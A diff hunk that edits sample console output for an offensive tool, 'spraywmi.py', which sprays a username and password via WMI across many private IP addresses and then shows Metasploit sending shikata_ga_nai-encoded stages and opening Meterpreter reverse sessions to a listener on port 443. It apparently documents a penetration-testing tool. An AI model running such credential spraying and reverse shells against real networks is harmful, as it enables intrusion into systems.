@@ -43,105 +43,64 @@ root@stronghold:/home/relik# python spraywmi.py TS kennedy-test complexP255w0rd!
 
 [*] Launching WMI spray against IP: 192.168.90.1 - you should have a shell in the background. Once finished, shell will spawn
 
-[*] Launching WMI spray against IP: 192.168.90.2 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.7 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.11 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.14 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.16 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.18 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.25 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.30 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.37 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.38 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.39 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.41 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.46 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.52 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.53 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.54 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.55 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.58 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.63 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.64 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.101 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.102 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.106 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.107 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.113 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.119 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.151 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.158 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.159 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.171 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.174 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.175 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.176 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.183 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.184 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.187 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.197 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.199 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.203 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.204 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.208 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.216 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.223 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.225 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.227 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.228 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.231 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.237 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.240 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.244 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.248 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.90.252 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.0.1 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.0.2 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.0.3 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.0.4 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.0.92 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.96.3 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.96.4 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.96.11 - you should have a shell in the background. Once finished, shell will spawn
-[*] Launching WMI spray against IP: 192.168.96.12 - you should have a shell in the background. Once finished, shell will spawn
+<snip>
+
 [*] Launching WMI spray against IP: 192.168.96.20 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Launching WMI spray against IP: 192.168.96.21 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Launching WMI spray against IP: 192.168.96.22 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Launching WMI spray against IP: 192.168.96.23 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Launching WMI spray against IP: 192.168.96.242 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Launching WMI spray against IP: 192.168.1.13 - you should have a shell in the background. Once finished, shell will spawn
+
 [*] Spraying is still happening in the background, shells should arrive as they complete.
+
 [*] Interacting with Metasploit...
 
 msf exploit(handler) > 
+
 [*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.174
+
 [*] Meterpreter session 1 opened (192.168.47.24:443 -> 192.168.90.174:49868) at 2015-10-13 04:33:55 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.203
+
 [*] Meterpreter session 2 opened (192.168.47.24:443 -> 192.168.90.203:51333) at 2015-10-13 04:33:59 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.184
+
 [*] Meterpreter session 3 opened (192.168.47.24:443 -> 192.168.90.184:61218) at 2015-10-13 04:34:02 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.204
+
 [*] Meterpreter session 4 opened (192.168.47.24:443 -> 192.168.90.204:54219) at 2015-10-13 04:34:06 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.175
+
 [*] Meterpreter session 5 opened (192.168.47.24:443 -> 192.168.90.175:54210) at 2015-10-13 04:34:10 -0400
+
+<snip>
+
+[*] Meterpreter session 13 opened (192.168.47.24:443 -> 192.168.90.248:53657) at 2015-10-13 04:34:31 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
-[*] Sending encoded stage (885836 bytes) to 192.168.90.16
-[*] Meterpreter session 6 opened (192.168.47.24:443 -> 192.168.90.16:56657) at 2015-10-13 04:34:14 -0400
-[*] Encoded stage with x86/shikata_ga_nai
-[*] Sending encoded stage (885836 bytes) to 192.168.96.242
-[*] Meterpreter session 7 opened (192.168.47.24:443 -> 192.168.96.242:49504) at 2015-10-13 04:34:18 -0400
-[*] Encoded stage with x86/shikata_ga_nai
-[*] Sending encoded stage (885836 bytes) to 192.168.90.183
-[*] Meterpreter session 8 opened (192.168.47.24:443 -> 192.168.90.183:56926) at 2015-10-13 04:34:28 -0400
-[*] Encoded stage with x86/shikata_ga_nai
-[*] Sending encoded stage (885836 bytes) to 192.168.90.248
-[*] Meterpreter session 9 opened (192.168.47.24:443 -> 192.168.90.248:53657) at 2015-10-13 04:34:31 -0400
-[*] Encoded stage with x86/shikata_ga_nai
+
 [*] Sending encoded stage (885836 bytes) to 192.168.90.39
-[*] Meterpreter session 10 opened (192.168.47.24:443 -> 192.168.90.39:60451) at 2015-10-13 04:34:35 -0400
+
+[*] Meterpreter session 14 opened (192.168.47.24:443 -> 192.168.90.39:60451) at 2015-10-13 04:34:35 -0400
+
 [*] Encoded stage with x86/shikata_ga_nai
